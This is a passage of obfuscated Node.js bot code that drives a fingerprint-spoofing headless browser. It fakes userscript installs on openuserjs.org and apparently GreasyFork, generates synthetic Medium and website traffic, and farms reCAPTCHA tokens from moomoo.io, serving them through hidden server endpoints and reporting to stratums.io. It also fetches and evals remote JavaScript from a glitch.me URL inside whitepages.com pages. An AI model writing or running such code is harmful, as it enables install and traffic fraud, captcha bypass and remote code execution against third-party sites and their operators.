      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + W(0xd) + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + X(0xf) + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    X(0x3) + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    X(0x3) + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x18c5 + -0x1c6d + -0x34 * -0x12
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x2111 * 0x1 + 0x1 * 0x595 + -0x1b7c * -0x1)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1248 + -0x1cf1 + -0x7b * -0x17), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x105a + -0x12ee + 0x2f8), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1b5b + 0x2246 + 0x17 * -0x4d;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x3 * -0x7b + 0x262f + -0x27a0; w < getRandomInt(-0x1404 + -0x2033 * -0x1 + -0xc2e, -0x1 * 0xaea + 0x907 + -0x1 * -0x1e8); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x17bbe + -0x9332 + -0xd0 * -0x3a9);
        }
      }();
    }, 0x1 * 0x21fa + -0x2011 + -0x185), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Y = b;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x257 + -0x395 + 0x5ec;
      const x = await v['newPage']();
      if (await x['goto'](Y(0x12, 'j^3g') + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1 * -0xc1d + 0x1c11 + -0xff4, 0x1674 + -0x2455 + 0xe13 * 0x1)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x4e5c + -0xc544 + 0xec18);
    }, 0x4ed + -0x363 + -0x126), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        const Z = d;
        try {
          let s = -0x22e + -0x24cd + 0x26fb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u[Z(0xc)]('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1a8c + 0x2f * -0xc7 + 0x4acd), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x44f * 0x1 + 0x2553 + -0x2104), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x1af79f + -0x21a * 0x2ba + 0x2e6e23);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, 0x1e * 0x35 + -0x5 * -0x8a + 0xa * -0xda);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x15a7 + -0x2 * -0x63f + 0x9f1);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x3374 + -0x258e + -0xe * -0x143);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x36 * 0x14 + 0x19e * -0x2 + 0x775 * 0x1) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x88b + 0x2334 * 0x1 + -0x2bbe));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x960 * 0x2 + 0x23 * 0xbc + -0xa * 0xb2, D['indexOf']('\x20'));
        return B ? E['slice'](-0xb8e + -0x2316 + 0x2ea4, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0xe5 * 0xd + -0x3f2e + 0x3 * 0x25f5),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1 * 0x13f7 + -0x4c43 + -0x11 * -0x59c),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + a0(0x5) + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1883 + -0x18d4 + 0x3157; k < 0xac3 + 0x16f + -0xc2e; k++)
    setTimeout(f, (0x101 * -0x74 + 0xfa21 + 0x295 * 0x27) * k * getRandomInt(0x2420 + -0x39a + -0x2085, -0x321 + -0x80e + 0xb32));
  setInterval(() => {
    f();
    for (let l = -0x56 * -0x49 + -0x99a + 0x17e * -0xa; l < -0x1ad8 * 0x1 + -0x44c + -0x1 * -0x1f28; l++)
      setTimeout(f, (0x8 * -0x6d + -0x138b9 + 0x22681) * l * getRandomInt(-0x6cd * -0x5 + 0xd84 * 0x1 + -0x2f84, 0x46 * -0x87 + 0x5e * -0x2b + -0x34b7 * -0x1));
  }, 0xa47d * 0x53 + -0x762bb + 0x8fcb4);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x136d + 0x2 * 0x4f + 0x74d) * getRandomInt(0x1 * 0x24bb + -0x10e6 + -0x13d4, -0x82a + 0x1 * 0x239 + 0x5f6));
}, 0x1595 + -0x1132 * -0x1 + 0x1 * -0x2663);

function a() {
  const bk = [
    'qx3dLmkM',
    'OE19r7MIMW',
    'WOX8ra',
    'https://me',
    'jmoDWQJcL8oKASkVzXHW',
    '\x20Chrome/11',
    'DY55B3v0DwjLlG',
    'juf5CftcVG',
    'WQOhxv/dQSk2a8oxW7bE',
    'Agv4',
    'BgfZDej5DgvjBG',
    'W4H4WQlcVdH4W60oAmoc',
    'goto',
    'u2fMyxjPlZuZnW',
    'wvDyzMvSuMSZyG',
    'KHTML,\x20lik',
    'click',
    'hdldU8kEfSoehGv7bW',
    'WOZdUCofzmkJWPVdMmowyNK'
  ];
  a = function() {
    return bk;
  };
  return a();
}